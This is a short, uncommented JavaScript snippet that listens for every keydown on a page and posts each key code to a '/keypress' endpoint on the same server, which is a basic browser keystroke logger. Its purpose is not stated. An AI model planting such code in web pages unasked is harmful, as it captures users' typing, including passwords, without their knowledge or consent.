document.addEventListener('keydown', function(event) {
    $.post( "/keypress", {
        keypress: event.keyCode
    });
});
